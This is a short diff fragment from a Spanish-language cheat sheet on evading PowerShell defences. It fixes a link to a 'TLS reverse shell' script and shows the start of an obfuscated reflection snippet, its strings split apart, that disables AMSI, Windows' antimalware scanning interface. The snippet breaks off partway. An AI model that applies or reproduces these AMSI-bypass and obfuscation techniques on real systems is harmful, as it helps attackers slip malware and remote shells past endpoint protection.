@@ -35,7 +35,7 @@ set-alias new-exercise $($shurmano | foreach { if ($_ -cmatch '[A-Z]' 
 ```
 
 **3.- Una vez ofuscado, deshabilitar AMSI para lanzar script**
-Echad un vistazo a la función PatchMe del [tls reverse shell(https://github.com/g4ngli0s/chuletas/blob/master/bypasspowershell/tlsrevshell.ps1)] donde lo que realmente hace es cifrar esto:
+Echad un vistazo a la función PatchMe del [tls reverse shell](https://github.com/g4ngli0s/chuletas/blob/master/bypasspowershell/tlsrevshell.ps1) donde lo que realmente hace es cifrar esto:
 
 ```powershell
 [Delegate]::CreateDelegate(("Func``3[String, $(([String].Assembly.GetType('Syste' + 'm.Ref' + 'lect' + 'ion.Bi' + 'ndi' + 'ngF' + 'lags')).FullName), System.Reflection.FieldInfo]" -as [String].Assembly.GetType('Syste' + 'm.Typ' +
